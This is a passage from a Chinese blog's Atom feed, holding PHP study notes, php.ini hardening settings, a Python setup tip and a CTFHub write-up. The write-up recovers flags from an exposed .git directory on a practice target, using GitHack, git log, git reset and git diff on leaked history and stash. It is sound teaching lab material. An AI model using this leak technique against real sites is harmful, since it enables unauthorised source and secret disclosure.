    <content type="html"><![CDATA[<h3 id="魔术引号自动过滤"><a href="#魔术引号自动过滤" class="headerlink" title="魔术引号自动过滤"></a>魔术引号自动过滤</h3><a id="more"></a><p>magic_quotes_gpc= on (在PHP5.4.0中被移除)</p><p>如果是开启状态，那么将自动对用户提交的sql语句进行转义</p><p>会把所有的单引号(“’’”)双引号(““””)反斜杠(”\“)和空字符(NULL)加上反斜杠进行转义</p><p>可以使用addslashes来转义提交的请求，或者用stripslashes来删除转义</p><h3 id="远程文件"><a href="#远程文件" class="headerlink" title="远程文件"></a>远程文件</h3><h4 id="是否允许包含远程文件"><a href="#是否允许包含远程文件" class="headerlink" title="是否允许包含远程文件"></a>是否允许包含远程文件</h4><p>allow_url_include= off</p><h4 id="是否允许打开远程文件"><a href="#是否允许打开远程文件" class="headerlink" title="是否允许打开远程文件"></a>是否允许打开远程文件</h4><p>allow_url_open= on</p><h3 id="目录权限"><a href="#目录权限" class="headerlink" title="目录权限"></a>目录权限</h3><h4 id="HTTP头部版本信息"><a href="#HTTP头部版本信息" class="headerlink" title="HTTP头部版本信息"></a>HTTP头部版本信息</h4><p>expose_php = off</p><p>防止通过http头部泄露php的版本信息</p><h4 id="文件上传临时目录"><a href="#文件上传临时目录" class="headerlink" title="文件上传临时目录"></a>文件上传临时目录</h4><p>upload_tmp_dir=</p><p>上传文件临时保存的目录，如果不设置的话，则采用系统的临时目录</p><h4 id="用户可访问目录"><a href="#用户可访问目录" class="headerlink" title="用户可访问目录"></a>用户可访问目录</h4><p>open_basedir = </p><p>能够控制PHP脚本只能访问指定目录</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;魔术引号自动过滤&quot;&gt;&lt;a href=&quot;#魔术引号自动过滤&quot; class=&quot;headerlink&quot; title=&quot;魔术引号自动过滤&quot;&gt;&lt;/a&gt;魔术引号自动过滤&lt;/h3&gt;
    
    </summary>
    
    
    
      <category term="代码审计" scheme="http://lingxin16.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>php学习day5</title>
    <link href="http://lingxin16.github.io/2020/03/16/php%E5%AD%A6%E4%B9%A0day5/"/>
    <id>http://lingxin16.github.io/2020/03/16/php%E5%AD%A6%E4%B9%A0day5/</id>
    <published>2020-03-16T12:54:41.000Z</published>
    <updated>2020-03-16T13:29:01.120Z</updated>
    
    <content type="html"><![CDATA[<h2 id="流程控制"><a href="#流程控制" class="headerlink" title="流程控制"></a>流程控制</h2><a id="more"></a><p>流程控制：代码执行的方向</p><h3 id="控制分类"><a href="#控制分类" class="headerlink" title="控制分类"></a>控制分类</h3><p>顺序结构：代码从上往下，顺序执行。（代码执行的最基本结构）</p><p>分支结构：给定一个条件，同时有多种可执行代码(块)，然后根据条件执行某一段代码</p><p>循环结构：在某个条件控制范围内，指定的代码(块)可以重复执行</p><h4 id="顺序结构"><a href="#顺序结构" class="headerlink" title="顺序结构"></a>顺序结构</h4><p>顺序结构:最基本结构，所有代码默认都是从上往下依次执行</p><h4 id="分支结构"><a href="#分支结构" class="headerlink" title="分支结构"></a>分支结构</h4><p>在PHP中，分支结构主要有两种: if 分支和switch分支</p><h5 id="if分支"><a href="#if分支" class="headerlink" title="if分支"></a>if分支</h5><p>最简if：</p><p>if(条件表达式){</p><p>​    //满足条件所要执行的内容；顺序结构</p><p>}</p><p>基础if</p><p>if(条件表达式){</p><p>​    //满足条件所要执行的内容；</p><p>}else{</p><p>​    //不满足条件所要执行的代码段</p><p>}</p><p>复杂if结构</p><p>if(条件表达式1){</p><p>​    //满足表达式1的代码段；</p><p>}elseif(条件表达式2){</p><p>​    //不满足表达式1的代码段，但是满足表达式2的代码段；</p><p>}    //可是使用多个elseif来判断</p><p>else{</p><p>​    //全部不满足要执行的代码</p><p>}</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;流程控制&quot;&gt;&lt;a href=&quot;#流程控制&quot; class=&quot;headerlink&quot; title=&quot;流程控制&quot;&gt;&lt;/a&gt;流程控制&lt;/h2&gt;
    
    </summary>
    
    
    
      <category term="php" scheme="http://lingxin16.github.io/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>php学习day4</title>
    <link href="http://lingxin16.github.io/2020/03/15/php%E5%AD%A6%E4%B9%A0day4/"/>
    <id>http://lingxin16.github.io/2020/03/15/php%E5%AD%A6%E4%B9%A0day4/</id>
    <published>2020-03-15T13:52:40.000Z</published>
    <updated>2020-03-15T14:59:58.060Z</updated>
    
    <content type="html"><![CDATA[<h2 id="计算机码"><a href="#计算机码" class="headerlink" title="计算机码"></a>计算机码</h2><a id="more"></a><p>计算机码：计算机在实际存储数据的时候，采用的编码规则（二进制规则）</p><p>计算机码：原码、反码和补码，数值本身最左边一位是符号位，正数为0，负数为1</p><p>原码：数据本身从十进制转换成二进制得到的结果</p><p>​        正数：左边符号位为0  (正数的原码、反码和补码就是原码本身)</p><p>​        负数：左边符号位为1</p><p>反码：针对负数，符号位不变，其他位取反(01转换)</p><p>补码：针对负数，反码+1</p><p>系统中存在两个0：+0和-0</p><p>+0:00000000</p><p>-0:10000000    原码</p><p>取反：11111111</p><p>补码：00000000</p><h2 id="位运算符"><a href="#位运算符" class="headerlink" title="位运算符"></a>位运算符</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">位运算:取出计算机中最小的单位(位bit)进行运算</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">&amp;：按位与，两个位都为1，结果为1，否则为0</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">|：按位或，两个有一-个为1，结果为1</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">~：按位非，一个位如果为1则变成0，否则反之</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">^：按位异或，两个相同则为0,不同则为1</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">&lt;&lt;：按位左移，整个位(32位), 向左移动一位，右边补0</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">&gt;&gt;：按位右移，整个位向右移动一位，左边补符号位对应内容(正数补0，负数补1)</span></pre></td></tr></table></figure><p>计算机进行任何位运算时使用的是补码</p><p>运算结束之后都必须转换成原码才是最终要显示的数据</p><p>按位左移：乘以2的操作</p><p>按位右移：除以2的操作</p><h2 id="运算符优先级"><a href="#运算符优先级" class="headerlink" title="运算符优先级"></a>运算符优先级</h2><p>运算符优先级:在多种运算符同时存在的时候，如何结合运算</p><p><img src="/2020/03/15/php%E5%AD%A6%E4%B9%A0day4/QQ%E6%88%AA%E5%9B%BE20200315225044.jpg" alt="QQ截图20200315225044"></p><p><img src="/2020/03/15/php%E5%AD%A6%E4%B9%A0day4/QQ%E6%88%AA%E5%9B%BE20200315225106.jpg" alt="QQ截图20200315225106"></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;计算机码&quot;&gt;&lt;a href=&quot;#计算机码&quot; class=&quot;headerlink&quot; title=&quot;计算机码&quot;&gt;&lt;/a&gt;计算机码&lt;/h2&gt;
    
    </summary>
    
    
    
      <category term="php" scheme="http://lingxin16.github.io/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>Python安装双版本</title>
    <link href="http://lingxin16.github.io/2020/03/15/Python%E5%AE%89%E8%A3%85%E5%8F%8C%E7%89%88%E6%9C%AC/"/>
    <id>http://lingxin16.github.io/2020/03/15/Python%E5%AE%89%E8%A3%85%E5%8F%8C%E7%89%88%E6%9C%AC/</id>
    <published>2020-03-15T09:37:56.000Z</published>
    <updated>2020-03-15T09:46:12.718Z</updated>
    
    <content type="html"><![CDATA[<p>Python的环境部署一直是有问题，今天就想个办法把这个问题解决了</p><p>同时安装Python2和Python3的版本并配置环境变量</p><a id="more"></a><p>在官网下载Python2和Python3的安装包</p><p>安装Python2和Python3的时候都勾选add to path(配置环境变量)</p><p>然后在Python2文件夹里把python.exe改为python2.exe</p><p>同理在scripts文件夹下把pip.exe分别改为pip2.exe</p><p>这个时候测试的话pip2 -V命令会报错</p><p>我们在官网下载pip安装包，cmd中cd命令进入安装文件</p><p>然后python2 setup.py install</p><p><img src="/2020/03/15/Python%E5%AE%89%E8%A3%85%E5%8F%8C%E7%89%88%E6%9C%AC/1.png" alt="1"></p><p>ok！</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Python的环境部署一直是有问题，今天就想个办法把这个问题解决了&lt;/p&gt;
&lt;p&gt;同时安装Python2和Python3的版本并配置环境变量&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="环境部署" scheme="http://lingxin16.github.io/tags/%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/"/>
    
  </entry>
  
  <entry>
    <title>php学习day3</title>
    <link href="http://lingxin16.github.io/2020/03/14/php%E5%AD%A6%E4%B9%A0day3/"/>
    <id>http://lingxin16.github.io/2020/03/14/php%E5%AD%A6%E4%B9%A0day3/</id>
    <published>2020-03-14T14:13:25.000Z</published>
    <updated>2020-03-14T16:19:59.216Z</updated>
    
    <content type="html"><![CDATA[<h2 id="浮点类型"><a href="#浮点类型" class="headerlink" title="浮点类型"></a>浮点类型</h2><a id="more"></a><p>浮点型：小数类型以及超过整型所能存储范围的整数</p><p>浮点型定义：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">$f&#x3D;1.23;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">$f&#x3D;1.23e10;      &#x2F;&#x2F;科学计数法，其中e表示低10   1.23×10^10</span></pre></td></tr></table></figure><p>浮点数不够精确</p><h2 id="布尔类型"><a href="#布尔类型" class="headerlink" title="布尔类型"></a>布尔类型</h2><p>两个值：true和false  通常用于判断</p><p>在进行某些数据判断的时候，需要特别注意类型转换</p><p>Empty()：判断数据的值是否为“空”，而不是NULL，如果为空返回true，不为空返回false</p><p>lsset()：判断数据存储的变量本身是否存在，存在变量返回true，不存在返回false</p><p><img src="/2020/03/14/php%E5%AD%A6%E4%B9%A0day3/QQ%E6%88%AA%E5%9B%BE20200314222620.jpg" alt="QQ截图20200314222620"></p><h2 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h2><p>运算符：operator，是一种将数据进行运算的特殊符号，在php中一共有十种运算符之多</p><h3 id="赋值运算符"><a href="#赋值运算符" class="headerlink" title="赋值运算符"></a>赋值运算符</h3><p>赋值运算：符号是“=”，表示将右边的结果(可以是变量、数据、常量和其他运算出来的结果)，保存到内存的某个位置，然后将位置的内存地址赋值给左侧的变量(常量)</p><h3 id="算术运算符"><a href="#算术运算符" class="headerlink" title="算术运算符"></a>算术运算符</h3><p>+：执行数据累加<br>-：数据相减<br>*：两个数相乘<br>/：两个数相除<br>%：取余运算，两个数(整数)相除保留余数</p><p>在进行除法运算或取余运算时后边的数不能为零</p><h3 id="比较运算符"><a href="#比较运算符" class="headerlink" title="比较运算符"></a>比较运算符</h3><p>比较运算：比较两个数据的大小，或者两个内容是否相同</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&gt;：左边大于右边，返回true</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">&gt;&#x3D;：左边大于等于右边，返回true</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">&lt;：左边小于右边，返回true</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">&lt;&#x3D;：左边小于等于右边，返回true</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">&#x3D;&#x3D;：左边与右边的相同（大小相同），返回true</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">!&#x3D;：左边与右边的不同（大小不相同），返回true</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">&#x3D;&#x3D;&#x3D;：全等于 左边与右边的相同（大小以及数据的类型都要相同）</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">!&#x3D;&#x3D;：不全等于 左边与右边的不相同（大小或数据的类型不同）</span></pre></td></tr></table></figure><h3 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">逻辑运算：针对不同的结果进行匹配</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">&amp;&amp;：逻辑与  左边的条件与右边的条件同时成立（两边结果都为true）</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">||：逻辑或 左边的条件嚯右边的条件只要有一个满足即可</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">！：逻辑非 对已有条件进行取反</span></pre></td></tr></table></figure><p>逻辑与和逻辑或又称为短路运算：如果第-一个表达式结果已经满足条件了，那么就不会运行逻辑运算符后面的表达式  在书写代码的时候，尽量将出现概率最高的(能够直接判断出结果)的表达式放到第一位</p><h3 id="连接运算符"><a href="#连接运算符" class="headerlink" title="连接运算符"></a>连接运算符</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">连接运算:是PHP中将多个字符串拼接的一种符号</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">.：将两个字符串连接到一起</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">.&#x3D;：复合运算，将左边的内容与右边的内容连接起来，然后重新赋值给左边变量</span></pre></td></tr></table></figure><h3 id="错误抑制符"><a href="#错误抑制符" class="headerlink" title="错误抑制符"></a>错误抑制符</h3><p>在PHP中有一些错误可以提前预知，但是这些错误可能无法避免，但是又不希望报错给用户看，可以使用错误抑制符处理</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">@：在可能出错的表达式前面使用@符号即可</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">@(可能出错的代码);</span></pre></td></tr></table></figure><h3 id="三目运算符"><a href="#三目运算符" class="headerlink" title="三目运算符"></a>三目运算符</h3><p>三目运算:有三个表达式参与的运算(简单的的分支结构缩写)。</p><p>语法格式:</p><p>表达式1 ? 表达式2 :  表达式3;（如果表达式1成立，那么执行表达式2，否则执行表达式3）</p><h3 id="自操作运算符"><a href="#自操作运算符" class="headerlink" title="自操作运算符"></a>自操作运算符</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">++</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">--</span></pre></td></tr></table></figure><p>后置自操作运算符$a++</p><p>前置自操作运算符++$a</p><p>b=$a++   先赋值再运算</p><p>b=++$a   先运算再赋值</p><p>衍生符号：类似自操作</p><p>+=：左边的结果与右边的结果相加，然后赋值给左边<br>-=：左边的减去右边的结果，然后赋值给左边<br>*=：乘法操作<br>/=：除法操作<br>%=：模操作</p><p>注意：右边是一个整体！</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;浮点类型&quot;&gt;&lt;a href=&quot;#浮点类型&quot; class=&quot;headerlink&quot; title=&quot;浮点类型&quot;&gt;&lt;/a&gt;浮点类型&lt;/h2&gt;
    
    </summary>
    
    
    
      <category term="php" scheme="http://lingxin16.github.io/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>ctfhub-信息泄露-Git泄露</title>
    <link href="http://lingxin16.github.io/2020/03/14/ctfhub-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-Git%E6%B3%84%E9%9C%B2/"/>
    <id>http://lingxin16.github.io/2020/03/14/ctfhub-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-Git%E6%B3%84%E9%9C%B2/</id>
    <published>2020-03-14T07:32:37.000Z</published>
    <updated>2020-03-17T09:24:09.824Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Log"><a href="#Log" class="headerlink" title="Log"></a>Log</h2><p>启动环境</p><p><img src="/2020/03/14/ctfhub-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-Git%E6%B3%84%E9%9C%B2/QQ%E6%88%AA%E5%9B%BE20200314153525.jpg" alt="QQ截图20200314153525"></p><a id="more"></a><p>在/.git/config中有内容，直接githack</p><p><img src="/2020/03/14/ctfhub-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-Git%E6%B3%84%E9%9C%B2/QQ%E6%88%AA%E5%9B%BE20200317164838.jpg" alt="QQ截图20200317164838"></p><p>在文件夹中并没有找到flag文件</p><p>使用<code>git log</code>查看记录</p><p><img src="/2020/03/14/ctfhub-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-Git%E6%B3%84%E9%9C%B2/QQ%E6%88%AA%E5%9B%BE20200317164910.jpg" alt="QQ截图20200317164910"></p><p>可以看到在第二条记录中能看到add flag</p><p>使用<code>git reset --hard 59218d2bc0dc24072e15f3bd2dc8a89692f90ac2</code>恢复记录</p><p>得到一个txt文件，打开得到flag</p><p><img src="/2020/03/14/ctfhub-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-Git%E6%B3%84%E9%9C%B2/QQ%E6%88%AA%E5%9B%BE20200317164924.jpg" alt="QQ截图20200317164924"></p><p>或者使用<code>git diff 59218d2bc0dc24072e15f3bd2dc8a89692f90ac2</code>查看当前记录和add flag的区别</p><p>得到flag</p><p><img src="/2020/03/14/ctfhub-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-Git%E6%B3%84%E9%9C%B2/QQ%E6%88%AA%E5%9B%BE20200317165038.jpg" alt="QQ截图20200317165038"></p><h2 id="Stash"><a href="#Stash" class="headerlink" title="Stash"></a>Stash</h2><p>启动环境</p><p><img src="/2020/03/14/ctfhub-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-Git%E6%B3%84%E9%9C%B2/QQ%E6%88%AA%E5%9B%BE20200317170252.jpg" alt="QQ截图20200317170252"></p><p>用githack处理得到</p><p><img src="/2020/03/14/ctfhub-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-Git%E6%B3%84%E9%9C%B2/QQ%E6%88%AA%E5%9B%BE20200317170456.jpg" alt="QQ截图20200317170456"></p><p>再查看日志找到查看add flag目录发现并没有flag</p><p><img src="/2020/03/14/ctfhub-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-Git%E6%B3%84%E9%9C%B2/QQ%E6%88%AA%E5%9B%BE20200317171711.jpg" alt="QQ截图20200317171711"></p><p>在.git/refs/stash文件中发现<code>5a1c50dc9be3bb089c2f9a1e737cea77f0e0c32f</code></p><p><code>git diff 5a1c50dc9be3bb089c2f9a1e737cea77f0e0c32f</code>得到flag</p><p><img src="/2020/03/14/ctfhub-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-Git%E6%B3%84%E9%9C%B2/QQ%E6%88%AA%E5%9B%BE20200317171907.jpg" alt="QQ截图20200317171907"></p><h2 id="Index"><a href="#Index" class="headerlink" title="Index"></a>Index</h2><p>同样用githack处理文件</p><p>在txt文件中发现flag</p><p><img src="/2020/03/14/ctfhub-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-Git%E6%B3%84%E9%9C%B2/QQ%E6%88%AA%E5%9B%BE20200317172256.jpg" alt="QQ截图20200317172256"></p><p>相关说明：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">当前大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当,可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞。</span></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Log&quot;&gt;&lt;a href=&quot;#Log&quot; class=&quot;headerlink&quot; title=&quot;Log&quot;&gt;&lt;/a&gt;Log&lt;/h2&gt;&lt;p&gt;启动环境&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2020/03/14/ctfhub-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-Git%E6%B3%84%E9%9C%B2/QQ%E6%88%AA%E5%9B%BE20200314153525.jpg&quot; alt=&quot;QQ截图20200314153525&quot;&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ctfhub" scheme="http://lingxin16.github.io/tags/ctfhub/"/>
    
      <category term="web" scheme="http://lingxin16.github.io/tags/web/"/>
    
      <category term="信息泄露" scheme="http://lingxin16.github.io/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
    
      <category term="Git泄露" scheme="http://lingxin16.github.io/tags/Git%E6%B3%84%E9%9C%B2/"/>
    
  </entry>
  
  <entry>
    <title>php学习day2</title>
    <link href="http://lingxin16.github.io/2020/03/13/php%E5%AD%A6%E4%B9%A0day2/"/>
    <id>http://lingxin16.github.io/2020/03/13/php%E5%AD%A6%E4%B9%A0day2/</id>
    <published>2020-03-13T13:34:25.000Z</published>
    <updated>2020-03-13T14:22:39.777Z</updated>
    
    <content type="html"><![CDATA[<h2 id="数据类型判断"><a href="#数据类型判断" class="headerlink" title="数据类型判断"></a>数据类型判断</h2><a id="more"></a><p>通过一组类型判断函数，来判断变量，最终返回这个变量所保存数据的数据类型(相同为true,否则为false)：是一组以is_开头后面跟类型名字的函数</p><p>is_×××(变量名)</p><p>Bool(布尔)类型不能用echo来查看，可以使用var_dump来查看</p><p>Var_dump(变量1,变量2…)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">Var_dump(is_int($a));</span></pre></td></tr></table></figure><p>Gettype(变量名)：获取类型 得到的是该类型对应的字符串</p><p>Settype(变量名,类型)：设定数据类型，与强制转换不同</p><p>1.强制转换(类型)变量名，是对数据复制的内容进行处理（不会处理实际存储的内容）</p><p>2.Settype会直接改变数据本身</p><h2 id="整数类型进制"><a href="#整数类型进制" class="headerlink" title="整数类型进制"></a>整数类型进制</h2><h3 id="整数类型"><a href="#整数类型" class="headerlink" title="整数类型"></a>整数类型</h3><p>在PHP中提供了四种整型的定义方式：十进制定义、二进制定义、八进制定义、十六进制定义</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">$a&#x3D;120;        &#x2F;&#x2F;10进制</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">$a&#x3D;0b110;      &#x2F;&#x2F;2进制</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">$a&#x3D;0120;       &#x2F;&#x2F;8进制</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">$a&#x3D;0×120;      &#x2F;&#x2F;16进制</span></pre></td></tr></table></figure><p>默认的PHP输出数值都会自动转换成10进制</p><h3 id="整数类型进制转换"><a href="#整数类型进制转换" class="headerlink" title="整数类型进制转换"></a>整数类型进制转换</h3><p><img src="/2020/03/13/php%E5%AD%A6%E4%B9%A0day2/QQ%E6%88%AA%E5%9B%BE20200313221130.jpg" alt="QQ截图20200313221130"></p><p><img src="/2020/03/13/php%E5%AD%A6%E4%B9%A0day2/QQ%E6%88%AA%E5%9B%BE20200313221726.jpg" alt="QQ截图20200313221726"></p><p>Decbin():     十进制转二进制</p><p>Decoct():     十进制转八进制</p><p>Dechex():     十进制转十六进制</p><p>Bindec():      二进制转十进制</p><p>……以此类推</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">var_dump(decbin(107));</span></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;数据类型判断&quot;&gt;&lt;a href=&quot;#数据类型判断&quot; class=&quot;headerlink&quot; title=&quot;数据类型判断&quot;&gt;&lt;/a&gt;数据类型判断&lt;/h2&gt;
    
    </summary>
    
    
    
      <category term="php" scheme="http://lingxin16.github.io/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>php学习day1</title>
    <link href="http://lingxin16.github.io/2020/03/12/php%E5%AD%A6%E4%B9%A0day1/"/>
    <id>http://lingxin16.github.io/2020/03/12/php%E5%AD%A6%E4%B9%A0day1/</id>
    <published>2020-03-12T07:15:35.000Z</published>
    <updated>2020-03-12T11:32:51.765Z</updated>
    
    <content type="html"><![CDATA[<h2 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h2><a id="more"></a><h3 id="常量定义："><a href="#常量定义：" class="headerlink" title="常量定义："></a>常量定义：</h3><p>常量在定义时必须赋值</p><p>define(‘常量名’,常量值)；</p><p>const 常量名 = 常量值;//(php5.3之后)</p><p>常量名命名规则:</p><p>1.常量的名字组成由字母、数字和下划线组成，不能以数字开头</p><p>2.常量的名字通常是以大写字母为主(为了与变量区别)</p><p>3.常量的名字可以使用一些特殊符号(如-_-(只能使用define))</p><p>特殊名字的常量在访问时需要用echo constant(‘常量名’);</p><h3 id="系统常量"><a href="#系统常量" class="headerlink" title="系统常量"></a>系统常量</h3><p>系统常量:系统定义，用户可以直接调用。</p><p>常见系统常量:</p><p>PHP_VERSION：PHP版本号</p><p>PHP_INT_SIZE：整形大小</p><p>PHP_INT_MAX：整形能表示的最大值</p><h3 id="特殊常量"><a href="#特殊常量" class="headerlink" title="特殊常量"></a>特殊常量</h3><p>由双下划线开始+常量名+双下划线结束(系统魔术常量)</p><p>会随着环境变化，但无法改变</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">__DIR__：当前被执行的脚本所在电脑的绝对路径</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">__FILE__：当前被执行的脚本所在电脑的绝对路径（带自己的文件名）</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">__LINE__：当前所属的行数</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">__NAMESPACE__：当前所属的命名空间</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">__CLASS__：当前所属的类</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">__METHOD__：当前所属的方法</span></pre></td></tr></table></figure><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><p>数据类型：data type，在PHP中指的是存储的数据本身的类型，而不是变量的类型。PHP是一种弱类型语言，变量本身没有数据类型。</p><h3 id="PHP的八种数据类型："><a href="#PHP的八种数据类型：" class="headerlink" title="PHP的八种数据类型："></a>PHP的八种数据类型：</h3><p>在PHP中将数据分为三大类八小类</p><h4 id="简单-基本-数据类型：4小类"><a href="#简单-基本-数据类型：4小类" class="headerlink" title="简单(基本)数据类型：4小类"></a>简单(基本)数据类型：4小类</h4><p>整型：int/integer，系统分配4个字节存储，表示整数类型</p><p>浮点型：float/double，系统分配8个字节存储，表示小数或者整型存不下的整数</p><p>字符串型：string，系统根据实际长度分配，表示字符串(引号)</p><p>布尔类型：bool/boolean，表示布尔类型，只有两个值：true和false</p><h4 id="复合数据类型：2小类"><a href="#复合数据类型：2小类" class="headerlink" title="复合数据类型：2小类"></a>复合数据类型：2小类</h4><p>对象类型：object，存放对象(面向对象)</p><p>数组类型：array，存储多个数据(一次性)</p><h4 id="特殊数据类型：2小类"><a href="#特殊数据类型：2小类" class="headerlink" title="特殊数据类型：2小类"></a>特殊数据类型：2小类</h4><p>资源类型：resource，存放资源数据(PHP外部数据，如数据库、文件)</p><p>空类型：NULL，只有一个值就是NULL(不能运算)</p><h2 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h2><p>1.自动转换：系统根据需求自己判断、自己转换</p><p>2.强制(手动)转换：认为根据需要的目标类型转换</p><p>在转换过程中用的比较多的就是转布尔类型(判断)和转数值类型(算数运算)</p><p><img src="/2020/03/12/php%E5%AD%A6%E4%B9%A0day1/QQ%E6%88%AA%E5%9B%BE20200312160116.jpg" alt="QQ截图20200312160116"></p><p>1.布尔true为1，false为0</p><p>2.字符串转数值有自己的规则</p><p>2.1以字母开头的字符串永远为0</p><p>2.2以数字开头的字符串，取到碰到字符串为止(不会同时包含两个小数点)</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;常量&quot;&gt;&lt;a href=&quot;#常量&quot; class=&quot;headerlink&quot; title=&quot;常量&quot;&gt;&lt;/a&gt;常量&lt;/h2&gt;
    
    </summary>
    
    
    
      <category term="php" scheme="http://lingxin16.github.io/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>ctfhub-信息泄泄露_备份文件下载</title>
